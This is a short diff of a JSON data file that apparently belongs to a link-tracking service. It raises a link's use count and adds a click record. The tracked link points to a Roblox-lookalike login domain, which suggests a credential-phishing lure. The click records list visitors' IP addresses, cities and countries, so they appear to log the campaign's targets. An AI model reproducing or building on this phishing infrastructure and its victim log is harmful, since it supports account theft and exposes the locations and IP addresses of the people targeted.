@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1549,
+    "useCount": 1550,
     "createdBy": "admin",
     "clicks": [
       {
@@ -12558,6 +12558,14 @@
         "ip": "180.191.136.114",
         "country": "Philippines",
         "city": "Makati City",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777450257969,
+        "ip": "49.145.200.164",
+        "country": "Philippines",
+        "city": "Cagayan de Oro",
         "flag": "🇵🇭",
         "countryCode": "PH"
       }
